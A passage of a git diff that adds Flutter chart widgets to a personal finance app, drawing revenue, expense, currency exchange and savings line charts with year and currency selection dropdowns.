titlesData => FlTitlesData(\n+    bottomTitles: AxisTitles(\n+      sideTitles: bottomTitles,\n+    ),\n+    \/\/ Ignore right details\n+    rightTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    \/\/ Ignore top details\n+    topTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    leftTitles: AxisTitles(\n+      sideTitles: leftTitles,\n+    ),\n+  );\n+\n+  List<LineChartBarData> get lineBarsData => [\n+    revenueChartBarData(),\n+    expenseChartBarData(),\n+  ];\n+  \n+  final List<String> monthList;\n+  final List<RevenueModel> revenues;\n+  final List<ExpenseModel> expenses;\n+\n+  const BalanceYearLineChart({\n+    required this.monthList,\n+    required this.revenues,\n+    required this.expenses,\n+    super.key});\n+\n+  @override\n+  Widget build(BuildContext context) {\n+    return Padding(\n+      padding: const EdgeInsets.all(15),\n+      child: LineChart(\n+        LineChartData(\n+          gridData: FlGridData(show: true),\n+          titlesData: titlesData,\n+          borderData: borderData,\n+          lineBarsData: lineBarsData,\n+          minX: 1,\n+          maxX: 12,\n+          maxY: getMaxQuantity(),\n+          minY: 0,\n+        ),\n+        swapAnimationDuration: const Duration(milliseconds: 250),\n+      ),\n+    );\n+  }\n+\n+  @visibleForTesting\n+  LineChartBarData revenueChartBarData() {\n+    \/\/ Dictionary with months and revenue quantities per month\n+    Map<int, double> spotsMap = {};\n+    for (RevenueModel revenue in revenues) {\n+      if (spotsMap.containsKey(revenue.date.month)) {\n+        spotsMap[revenue.date.month] = spotsMap[revenue.date.month]! + revenue.quantity;\n+      } else {\n+        spotsMap[revenue.date.month] = revenue.quantity;\n+      }\n+    }\n+    \/\/ Check unexistant months\n+    for (int month = 1; month <= 12; month++) {\n+      if (!spotsMap.containsKey(month)) {\n+        spotsMap[month] = 0.0;\n+      }\n+    }\n+    \/\/ Data conversion\n+    List<FlSpot> spots = [];\n+    for (int month in spotsMap.keys.toList()..sort()) {\n+      spots.add(FlSpot(month.toDouble(), spotsMap[month]!.toDouble()));\n+    }\n+    return LineChartBarData(\n+      isCurved: true,\n+      preventCurveOverShooting: true,\n+      color: const Color.fromARGB(184, 0, 175, 15),\n+      barWidth: 2,\n+      isStrokeCapRound: true,\n+      dotData: FlDotData(show: false),\n+      belowBarData: BarAreaData(\n+        show: true,\n+        color: const Color.fromARGB(55, 0, 175, 15),\n+      ),\n+      spots: spots\n+    );\n+  }\n+\n+  @visibleForTesting\n+  LineChartBarData expenseChartBarData() { \n+    \/\/ Dictionary with months and expense quantities per month\n+    Map<int, double> spotsMap = {};\n+    for (ExpenseModel expense in expenses) {\n+      if (spotsMap.containsKey(expense.date.month)) {\n+        spotsMap[expense.date.month] = spotsMap[expense.date.month]! + expense.quantity;\n+      } else {\n+        spotsMap[expense.date.month] = expense.quantity;\n+      }\n+    }\n+    \/\/ Check unexistant months\n+    for (int month = 1; month <= 12; month++) {\n+      if (!spotsMap.containsKey(month)) {\n+        spotsMap[month] = 0.0;\n+      }\n+    }\n+    \/\/ Data conversion\n+    List<FlSpot> spots = [];\n+    for (int month in spotsMap.keys.toList()..sort()) {\n+      spots.add(FlSpot(month.toDouble(), spotsMap[month]!.toDouble()));\n+    }\n+    return LineChartBarData(\n+      isCurved: true,\n+      preventCurveOverShooting: true,\n+      color: const Color.fromARGB(188, 255, 17, 0),\n+      barWidth: 2,\n+      isStrokeCapRound: true,\n+      dotData: FlDotData(show: false),\n+      belowBarData: BarAreaData(\n+        show: true,\n+        color: const Color.fromARGB(55, 212, 117, 117),\n+      ),\n+      spots: spots\n+    );\n+  }\n+\n+  @visibleForTesting\n+  double getMaxQuantity() {\n+    double quantity = 4.0;\n+    Map<String, double> quantityMap = {};\n+    for (RevenueModel revenue in revenues) {\n+      String key = \"${revenue.date.month}\";\n+      if (quantityMap.containsKey(key)) {\n+        quantityMap[key] = quantityMap[key]! + revenue.quantity;\n+      } else {\n+        quantityMap[key] = revenue.quantity;\n+      }\n+    }\n+    if (revenues.isNotEmpty) {\n+      quantity = quantityMap.values.reduce(max);\n+    }\n+    quantityMap = {};\n+    for (ExpenseModel expense in expenses) {\n+      String key = \"${expense.date.month}\";\n+      if (quantityMap.containsKey(key)) {\n+        quantityMap[key] = quantityMap[key]! + expense.quantity;\n+      } else {\n+        quantityMap[key] = expense.quantity;\n+      }\n+    }\n+    if (expenses.isNotEmpty && quantity < quantityMap.values.reduce(max)) {\n+      quantity = quantityMap.values.reduce(max);\n+    }\n+    if (quantity < 4) quantity = 4;\n+    return quantity.ceilToDouble();\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/currency\/currency_chart_container.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/currency\/currency_chart_container.dart\nnew file mode 100644\nindex 0000000..2369b94\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/currency\/currency_chart_container.dart\n@@ -0,0 +1,130 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/localization_provider.dart';\n+import 'package:balance_home_app\/src\/features\/expense\/data\/models\/expense_model.dart';\n+import 'package:balance_home_app\/src\/features\/revenue\/data\/models\/revenue_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_exchange_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/statistics_data_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_exchange\/selected_exchange_model_state_notifier.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/currency\/currency_line_chart.dart';\n+import 'package:flutter\/material.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+class CurrencyChartContainer extends ConsumerWidget {\n+  final StatisticsDataModel statisticsData;\n+\n+  const CurrencyChartContainer({\n+    required this.statisticsData,\n+    super.key\n+  });\n+\n+  @override\n+  Widget build(BuildContext context, WidgetRef ref) {\n+    final appLocalizations = ref.watch(localizationStateNotifierProvider).localization;\n+    SelectedExchangeModel selectedExchange = ref.watch(selectedExchangeStateNotifierProvider).model;\n+    SelectedExchangeModelStateNotifier selectedExchangeDateNotifier = ref.read(selectedExchangeStateNotifierProvider.notifier);\n+    \/\/ Coin codes list\n+    List<String> coins = statisticsData.coinTypes.map((e) => e.code).toList();\n+    String selectedCoinFrom = selectedExchange.selectedCoinFrom;\n+    String selectedCoinTo = selectedExchange.selectedCoinTo;\n+    \/\/ Screen sizes:\n+    double screenHeight = MediaQuery.of(context).size.height;\n+    double screenWidth = MediaQuery.of(context).size.width;\n+    double chartLineHeight = (screenHeight * 0.65 <= 350) ? \n+      350 : (screenHeight * 0.65 <= 500) ? screenHeight * 0.65 : 500;\n+    return Column(\n+      children: [\n+        Row(\n+          mainAxisAlignment: MainAxisAlignment.center,\n+          children: [\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 61, 138, 247),\n+              height: 45,\n+              width: screenWidth * 0.70,\n+              child: Center(\n+                child: Text(\n+                  style: const TextStyle(\n+                    color: Colors.white,\n+                    fontSize: 18,\n+                    fontWeight: FontWeight.bold\n+                  ),\n+                  appLocalizations.currencyChartTitle\n+                )\n+              ),\n+            ),\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 117, 169, 249),\n+              padding: const EdgeInsets.only(left: 10, right: 10),\n+              height: 45,\n+              child: DropdownButton<String>(\n+                value: selectedCoinFrom,\n+                items: coins.map(\n+                  (coin) {\n+                    return DropdownMenuItem<String>(\n+                      value: coin,\n+                      child: Text(coin),\n+                    );\n+                  }\n+                ).toList(),\n+                onChanged: (coin) {\n+                  selectedExchangeDateNotifier.setSelectedCoinFrom(\n+                    coin!\n+                  );\n+                }\n+              ),\n+            ),\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 117, 169, 249),\n+              padding: const EdgeInsets.only(left: 10, right: 10),\n+              height: 45,\n+              child: DropdownButton<String>(\n+                value: selectedCoinTo,\n+                items: coins.map(\n+                  (coin) {\n+                    return DropdownMenuItem<String>(\n+                      value: coin,\n+                      child: Text(coin),\n+                    );\n+                  }\n+                ).toList(),\n+                onChanged: (coin) {\n+                  selectedExchangeDateNotifier.setSelectedCoinTo(\n+                    coin!\n+                  );\n+                }\n+              ),\n+            )\n+          ],\n+        ),\n+        SizedBox(\n+          height: chartLineHeight,\n+          width: screenWidth * 0.90,\n+          child: CurrencyLineChart(\n+            selectedCoinFrom: statisticsData.selectedCoinFrom,\n+            selectedCoinTo: statisticsData.selectedCoinTo,\n+            dateExchangesModel: statisticsData.dateExchangesModel,\n+          )\n+        ),\n+      ],\n+    );\n+  }\n+\n+  List<ExpenseModel> getExpenses(int month) {\n+    List<ExpenseModel> expenses = [];\n+    for (ExpenseModel expense in statisticsData.expenses) {\n+      if (expense.date.month == month) expenses.add(expense);\n+    }\n+    return expenses;\n+  }\n+  \n+  List<RevenueModel> getRevenues(int month) {\n+    List<RevenueModel> revenues = [];\n+    for (RevenueModel revenue in statisticsData.revenues) {\n+      if (revenue.date.month == month) revenues.add(revenue);\n+    }\n+    return revenues;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/currency\/currency_line_chart.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/currency\/currency_line_chart.dart\nnew file mode 100644\nindex 0000000..2ff5328\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/currency\/currency_line_chart.dart\n@@ -0,0 +1,161 @@\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/date_exchange_model.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/date_exchanges_list_model.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/exchange_model.dart';\n+import 'package:balance_home_app\/src\/features\/coin\/data\/models\/exchanges_list_model.dart';\n+import 'package:fl_chart\/fl_chart.dart';\n+import 'package:flutter\/material.dart';\n+\n+class CurrencyLineChart extends StatelessWidget {\n+\n+  \/\/\/ Border chart lines decoration \n+  FlBorderData get borderData => FlBorderData(\n+    show: true,\n+    border: const Border(\n+      bottom: BorderSide(color: Colors.black, width: 2),\n+      left: BorderSide(color: Colors.black, width: 2),\n+      right: BorderSide(color: Colors.transparent),\n+      top: BorderSide(color: Colors.transparent),\n+    ),\n+  );\n+\n+  SideTitles get bottomTitles => SideTitles(\n+    showTitles: true,\n+    reservedSize: 22,\n+    interval: 1,\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      DateTime date = DateTime.now().subtract(Duration(days: 19-value.toInt()));\n+      const style = TextStyle(\n+        color: Colors.black,\n+        fontSize: 12,\n+      );\n+      return SideTitleWidget(\n+        axisSide: meta.axisSide,\n+        space: 5,\n+        child: Text(\"${date.day}\/${date.month}\", style: style),\n+      );\n+    },\n+  );\n+\n+  SideTitles get leftTitles => SideTitles(\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      const style = TextStyle(\n+        color: Color(0xff75729e),\n+        fontWeight: FontWeight.bold,\n+        fontSize: 14,\n+      );\n+      return Text(\"$value\", style: style, textAlign: TextAlign.center);\n+    },\n+    showTitles: true,\n+    interval: (getMaxQuantity() \/ 5).ceilToDouble(),\n+    reservedSize: 40,\n+  );\n+\n+  \/\/\/ Border chart side tittles setup\n+  FlTitlesData get titlesData => FlTitlesData(\n+    bottomTitles: AxisTitles(\n+      sideTitles: bottomTitles,\n+    ),\n+    \/\/ Ignore right details\n+    rightTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    \/\/ Ignore top details\n+    topTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    leftTitles: AxisTitles(\n+      sideTitles: leftTitles,\n+    ),\n+  );\n+\n+  List<LineChartBarData> get lineBarsData => [\n+    currencyChartBarData(),\n+  ];\n+\n+  final String selectedCoinFrom;\n+  final String selectedCoinTo;\n+  final DateExchangesListModel dateExchangesModel;\n+  \n+  const CurrencyLineChart({\n+    required this.selectedCoinFrom,\n+    required this.selectedCoinTo,\n+    required this.dateExchangesModel,\n+    super.key\n+  });\n+\n+  @override\n+  Widget build(BuildContext context) {\n+    return Padding(\n+      padding: const EdgeInsets.all(15),\n+      child: LineChart(\n+        LineChartData(\n+          gridData: FlGridData(show: true),\n+          titlesData: titlesData,\n+          borderData: borderData,\n+          lineBarsData: lineBarsData,\n+          minX: 0,\n+          maxX: 19,\n+          maxY: getMaxQuantity(),\n+          minY: 0,\n+        ),\n+        swapAnimationDuration: const Duration(milliseconds: 250),\n+      ),\n+    );\n+  }\n+\n+  @visibleForTesting\n+  LineChartBarData currencyChartBarData() {\n+    List<FlSpot> spots = [];\n+    for (int i = 0; i <= 19; i++) {\n+      DateTime date = DateTime.now().subtract(Duration(days: 19-i));\n+      spots.add(FlSpot(i.toDouble(), getExchange(date)));\n+    }\n+    return LineChartBarData(\n+      isCurved: true,\n+      preventCurveOverShooting: true,\n+      color: const Color.fromARGB(200, 0, 65, 205),\n+      barWidth: 2,\n+      isStrokeCapRound: true,\n+      dotData: FlDotData(show: false),\n+      belowBarData: BarAreaData(\n+        show: true,\n+        color: const Color.fromARGB(55, 0, 65, 205),\n+      ),\n+      spots: spots\n+    );\n+  }\n+\n+  @visibleForTesting\n+  double getMaxQuantity() {\n+    double quantity = 1.0;\n+    for (DateExchangeModel dateExchange in dateExchangesModel.dateExchanges) {\n+      double current = getExchange(dateExchange.date);\n+      if (current > quantity) quantity = current;\n+    }\n+    return quantity.ceilToDouble();\n+  }\n+\n+  @visibleForTesting\n+  double getExchange(DateTime date) {\n+    \/\/ Same coin\n+    if (selectedCoinFrom == selectedCoinTo) return 1;\n+    \/\/ Search for coin\n+    for (DateExchangeModel dateExchange in dateExchangesModel.dateExchanges) {\n+      if (dateExchange.date.day == date.day \n+        && dateExchange.date.month == date.month \n+        && dateExchange.date.year == date.year) {\n+        for (ExchangesListModel exchanges in dateExchange.exchanges) {\n+          if (exchanges.code == selectedCoinFrom) {\n+            for (ExchangeModel exchange in exchanges.exchanges) {\n+              if (exchange.code == selectedCoinTo) {\n+                return exchange.value;\n+              }\n+            }\n+          }\n+        }\n+      }\n+    }\n+    \/\/ If not exists then 0\n+    return 0;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_eight_years_chart_container.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_eight_years_chart_container.dart\nnew file mode 100644\nindex 0000000..4712e41\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_eight_years_chart_container.dart\n@@ -0,0 +1,60 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/localization_provider.dart';\n+import 'package:balance_home_app\/src\/core\/services\/platform_service.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/statistics_data_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_eight_years_line_chart.dart';\n+import 'package:flutter\/material.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+class SavingsEightYearsChartContainer extends ConsumerWidget {\n+  final StatisticsDataModel statisticsData;\n+\n+  const SavingsEightYearsChartContainer({\n+    required this.statisticsData,\n+    super.key\n+  });\n+  \n+  @override\n+  Widget build(BuildContext context, WidgetRef ref) {\n+    final appLocalizations = ref.watch(localizationStateNotifierProvider).localization;\n+    \/\/ Screen sizes:\n+    double screenHeight = MediaQuery.of(context).size.height;\n+    double screenWidth = MediaQuery.of(context).size.width;\n+    double chartLineHeight = (screenHeight * 0.45 <= 200) ? \n+      200 : (screenHeight * 0.45 <= 350) ? screenHeight * 0.45 : 350;\n+    return Column(\n+      children: [\n+        Row(\n+          mainAxisAlignment: MainAxisAlignment.center,\n+          children: [\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 194, 56, 235),\n+              height: 45,\n+              width: (PlatformService().isSmallWindow(context)) ? \n+                screenWidth * 0.95 : screenWidth * 0.35,\n+              child: Center(\n+                child: Text(\n+                  style: const TextStyle(\n+                    color: Colors.white,\n+                    fontSize: 18,\n+                    fontWeight: FontWeight.bold\n+                  ),\n+                  appLocalizations.savingsEightChartTitle\n+                )\n+              ),\n+            )\n+          ],\n+        ),\n+        SizedBox(\n+          height: chartLineHeight,\n+          width: (PlatformService().isSmallWindow(context)) ? \n+            screenWidth * 0.95 : screenWidth * 0.45,\n+          child: SavingsEightYearsLineChart(\n+            annualBalances: statisticsData.annualBalances,\n+          )\n+        ),\n+      ],\n+    );\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_eight_years_line_chart.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_eight_years_line_chart.dart\nnew file mode 100644\nindex 0000000..2b614ad\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_eight_years_line_chart.dart\n@@ -0,0 +1,209 @@\n+import 'dart:math';\n+import 'package:balance_home_app\/src\/core\/data\/models\/min_max_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/annual_balance_model.dart';\n+import 'package:fl_chart\/fl_chart.dart';\n+import 'package:flutter\/material.dart';\n+\n+\/\/ ignore: must_be_immutable\n+class SavingsEightYearsLineChart extends StatelessWidget {\n+  \/\/\/ Border chart lines decoration \n+  FlBorderData get borderData => FlBorderData(\n+    show: true,\n+    border: const Border(\n+      bottom: BorderSide(color: Colors.black, width: 2),\n+      left: BorderSide(color: Colors.black, width: 2),\n+      right: BorderSide(color: Colors.transparent),\n+      top: BorderSide(color: Colors.transparent),\n+    ),\n+  );\n+\n+  SideTitles get bottomTitles => SideTitles(\n+    showTitles: true,\n+    reservedSize: 22,\n+    interval: 1,\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      const style = TextStyle(\n+        color: Colors.black,\n+        fontSize: 12,\n+      );\n+      return SideTitleWidget(\n+        axisSide: meta.axisSide,\n+        space: 5,\n+        child: Text(\"$value\", style: style),\n+      );\n+    },\n+  );\n+\n+  SideTitles get leftTitles => SideTitles(\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      const style = TextStyle(\n+        color: Color(0xff75729e),\n+        fontWeight: FontWeight.bold,\n+        fontSize: 14,\n+      );\n+      return Text(\"$value\", style: style, textAlign: TextAlign.center);\n+    },\n+    showTitles: true,\n+    interval: (\n+      ([getMinMaxQuantity().max.ceilToDouble(), \n+      getMinMaxQuantity().min.floorToDouble().abs()].reduce(max))\n+      \/ 5)\n+      .abs().ceilToDouble(),\n+    reservedSize: 40,\n+  );\n+\n+  \/\/\/ Border chart side tittles setup\n+  FlTitlesData get titlesData => FlTitlesData(\n+    bottomTitles: AxisTitles(\n+      sideTitles: bottomTitles,\n+    ),\n+    \/\/ Ignore right details\n+    rightTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    \/\/ Ignore top details\n+    topTitles: AxisTitles(\n+      sideTitles: SideTitles(showTitles: false),\n+    ),\n+    leftTitles: AxisTitles(\n+      sideTitles: leftTitles,\n+    ),\n+  );\n+\n+  List<LineChartBarData> get lineBarsData => [\n+    quantityChartBarData(),\n+    expectedChartBarData(),\n+  ];\n+  \n+  final List<AnnualBalanceModel> annualBalances;\n+  MinMaxModel? minMaxModel;\n+\n+  SavingsEightYearsLineChart({\n+    required this.annualBalances,\n+    this.minMaxModel,\n+    super.key});\n+\n+  @override\n+  Widget build(BuildContext context) {\n+    return Padding(\n+      padding: const EdgeInsets.all(15),\n+      child: LineChart(\n+        LineChartData(\n+          gridData: FlGridData(show: true),\n+          titlesData: titlesData,\n+          borderData: borderData,\n+          lineBarsData: lineBarsData,\n+          minX: DateTime.now().year.toDouble() - 7,\n+          maxX: DateTime.now().year.toDouble(),\n+          maxY: getMinMaxQuantity().max.ceilToDouble(),\n+          minY: getMinMaxQuantity().min.floorToDouble(),\n+        ),\n+        swapAnimationDuration: const Duration(milliseconds: 250),\n+      ),\n+    );\n+  }\n+\n+  @visibleForTesting\n+  LineChartBarData quantityChartBarData() {\n+    \/\/ Dictionary with years and gross quantities per year\n+    Map<int, double> spotsMap = {};\n+    for (AnnualBalanceModel annualBalance in annualBalances) {\n+      if (spotsMap.containsKey(annualBalance.year)) {\n+        spotsMap[annualBalance.year] = spotsMap[annualBalance.year]! + annualBalance.grossQuantity;\n+      } else {\n+        spotsMap[annualBalance.year] = annualBalance.grossQuantity;\n+      }\n+    }\n+    \/\/ Check unexistant years\n+    for (int year = DateTime.now().year-7; year <= DateTime.now().year; year++) {\n+      if (!spotsMap.containsKey(year)) {\n+        spotsMap[year] = 0.0;\n+      }\n+    }\n+    \/\/ Data conversion\n+    List<FlSpot> spots = [];\n+    for (int year in spotsMap.keys.toList()..sort()) {\n+      spots.add(FlSpot(year.toDouble(), spotsMap[year]!.toDouble()));\n+    }\n+    return LineChartBarData(\n+      isCurved: true,\n+      preventCurveOverShooting: true,\n+      color: const Color.fromARGB(184, 7, 95, 15),\n+      barWidth: 2,\n+      isStrokeCapRound: true,\n+      dotData: FlDotData(show: false),\n+      belowBarData: BarAreaData(\n+        show: true,\n+        color: const Color.fromARGB(34, 9, 82, 15),\n+      ),\n+      spots: spots\n+    );\n+  }\n+\n+  @visibleForTesting\n+  LineChartBarData expectedChartBarData() { \n+    \/\/ Dictionary with years and expected quantities per year\n+    Map<int, double> spotsMap = {};\n+    for (AnnualBalanceModel annualBalance in annualBalances) {\n+      spotsMap[annualBalance.year] = annualBalance.expectedQuantity;\n+    }\n+    \/\/ Check unexistant years\n+    for (int year = DateTime.now().year-7; year <= DateTime.now().year; year++) {\n+      if (!spotsMap.containsKey(year)) {\n+        spotsMap[year] = 0.0;\n+      }\n+    }\n+    \/\/ Data conversion\n+    List<FlSpot> spots = [];\n+    for (int year in spotsMap.keys.toList()..sort()) {\n+      spots.add(FlSpot(year.toDouble(), spotsMap[year]!.toDouble()));\n+    }\n+    return LineChartBarData(\n+      isCurved: true,\n+      preventCurveOverShooting: true,\n+      color: const Color.fromARGB(225, 224, 167, 231),\n+      barWidth: 2,\n+      isStrokeCapRound: true,\n+      dotData: FlDotData(show: false),\n+      belowBarData: BarAreaData(\n+        show: true,\n+        color: const Color.fromARGB(47, 224, 167, 231),\n+      ),\n+      spots: spots\n+    );\n+  }\n+\n+  @visibleForTesting\n+  MinMaxModel getMinMaxQuantity() {\n+    if (minMaxModel != null) return minMaxModel!;\n+    double maxQuantity = 4.0;\n+    double minQuantity = 0.0;\n+    Map<String, double> quantityMap = {};\n+    Map<String, double> expectedMap = {};\n+    for (AnnualBalanceModel annualBalance in annualBalances) {\n+      String key = \"${annualBalance.year}\";\n+      if (quantityMap.containsKey(key)) {\n+        quantityMap[key] = quantityMap[key]! + annualBalance.grossQuantity;\n+      } else {\n+        quantityMap[key] = annualBalance.grossQuantity;\n+      }\n+      if (expectedMap.containsKey(key)) {\n+        expectedMap[key] = expectedMap[key]! + annualBalance.expectedQuantity;\n+      } else {\n+        expectedMap[key] = annualBalance.expectedQuantity;\n+      }\n+    }\n+    if (annualBalances.isNotEmpty) {\n+      maxQuantity = quantityMap.values.reduce(max);\n+      double maxExpected = expectedMap.values.reduce(max);\n+      if (maxQuantity < maxExpected) maxQuantity = maxExpected;\n+      minQuantity = quantityMap.values.reduce(min);\n+      double minExpected = expectedMap.values.reduce(min);\n+      if (minQuantity > minExpected) minQuantity = minExpected;\n+    }\n+    if (maxQuantity < 4) maxQuantity = 4;\n+    if (minQuantity > 0) minQuantity = 0;\n+    minMaxModel = MinMaxModel(min: minQuantity, max: maxQuantity);\n+    return minMaxModel!;\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_year_chart_container.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_year_chart_container.dart\nnew file mode 100644\nindex 0000000..5c47230\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_year_chart_container.dart\n@@ -0,0 +1,97 @@\n+\n+import 'package:balance_home_app\/src\/core\/providers\/localization_provider.dart';\n+import 'package:balance_home_app\/src\/core\/services\/platform_service.dart';\n+import 'package:balance_home_app\/src\/core\/utils\/date_util.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/selected_date_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/statistics_data_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_provider.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/logic\/providers\/selected_date\/selected_date_model_state_notifier.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_year_line_chart.dart';\n+import 'package:flutter\/material.dart';\n+import 'package:flutter_riverpod\/flutter_riverpod.dart';\n+\n+class SavingsYearChartContainer extends ConsumerWidget {\n+  final StatisticsDataModel statisticsData;\n+\n+  const SavingsYearChartContainer({\n+    required this.statisticsData,\n+    super.key\n+  });\n+  \n+  @override\n+  Widget build(BuildContext context, WidgetRef ref) {\n+    final appLocalizations = ref.watch(localizationStateNotifierProvider).localization;\n+    SelectedDateModel selectedSavingsDate = ref.watch(selectedSavingsDateStateNotifierProvider).model;\n+    SelectedDateModelStateNotifier selectedSavingsDateNotifier = ref.read(selectedSavingsDateStateNotifierProvider.notifier);\n+    List<int> years = <int>{\n+      ...statisticsData.revenueYears, ...statisticsData.expenseYears\n+    }.toList();\n+    int selectedYear = selectedSavingsDate.year;\n+    \/\/ Month names list\n+    List<String> months = DateUtil.getMonthList(appLocalizations);\n+    \/\/ Adding selected year to years list\n+    if (!years.contains(selectedYear)) years.add(selectedYear);\n+    \/\/ Adding current year to years list\n+    if (!years.contains(DateTime.now().year)) years.add(DateTime.now().year);\n+    \/\/ Screen sizes:\n+    double screenHeight = MediaQuery.of(context).size.height;\n+    double screenWidth = MediaQuery.of(context).size.width;\n+    double chartLineHeight = (screenHeight * 0.45 <= 200) ? \n+      200 : (screenHeight * 0.45 <= 350) ? screenHeight * 0.45 : 350;\n+    return Column(\n+      children: [\n+        Row(\n+          mainAxisAlignment: MainAxisAlignment.center,\n+          children: [\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 194, 56, 235),\n+              height: 45,\n+              width: (PlatformService().isSmallWindow(context)) ? \n+                screenWidth * 0.80 : screenWidth * 0.35,\n+              child: Center(\n+                child: Text(\n+                  style: const TextStyle(\n+                    color: Colors.white,\n+                    fontSize: 18,\n+                    fontWeight: FontWeight.bold\n+                  ),\n+                  \"${appLocalizations.savingsChartTitle} $selectedYear\"\n+                )\n+              ),\n+            ),\n+            Container(\n+              margin: const EdgeInsets.only(top: 20, bottom: 10),\n+              color: const Color.fromARGB(255, 179, 141, 247),\n+              padding: const EdgeInsets.only(left: 10, right: 10),\n+              height: 45,\n+              child: DropdownButton<int>(\n+                value: selectedYear,\n+                items: years.map(\n+                  (year) {\n+                    return DropdownMenuItem<int>(\n+                      value: year,\n+                      child: Text(year.toString()),\n+                    );\n+                  }\n+                ).toList(),\n+                onChanged: (year) {\n+                  selectedSavingsDateNotifier.setYear(year!);\n+                }\n+              ),\n+            )\n+          ],\n+        ),\n+        SizedBox(\n+          height: chartLineHeight,\n+          width: (PlatformService().isSmallWindow(context)) ? \n+            screenWidth * 0.95 : screenWidth * 0.45,\n+          child: SavingsYearLineChart(\n+            monthList: months,\n+            monthlyBalances: statisticsData.monthlyBalances\n+          )\n+        ),\n+      ],\n+    );\n+  }\n+}\n\\ No newline at end of file\ndiff --git a\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_year_line_chart.dart b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_year_line_chart.dart\nnew file mode 100644\nindex 0000000..57b3a1f\n--- \/dev\/null\n+++ b\/frontend\/flutter\/lib\/src\/features\/statistics\/presentation\/widgets\/savings\/savings_year_line_chart.dart\n@@ -0,0 +1,216 @@\n+import 'dart:math';\n+import 'package:balance_home_app\/src\/core\/data\/models\/min_max_model.dart';\n+import 'package:balance_home_app\/src\/features\/statistics\/data\/models\/monthly_balance_model.dart';\n+import 'package:fl_chart\/fl_chart.dart';\n+import 'package:flutter\/material.dart';\n+\n+\/\/ ignore: must_be_immutable\n+class SavingsYearLineChart extends StatelessWidget {\n+  \/\/\/ Border chart lines decoration \n+  FlBorderData get borderData => FlBorderData(\n+    show: true,\n+    border: const Border(\n+      bottom: BorderSide(color: Colors.black, width: 2),\n+      left: BorderSide(color: Colors.black, width: 2),\n+      right: BorderSide(color: Colors.transparent),\n+      top: BorderSide(color: Colors.transparent),\n+    ),\n+  );\n+\n+  SideTitles get bottomTitles => SideTitles(\n+    showTitles: true,\n+    reservedSize: 22,\n+    interval: 1,\n+    getTitlesWidget: (double value, TitleMeta meta) {\n+      const style = TextStyle(\n+        color: Colors.black,\n+        fontSize: 12,\n+      );\n+     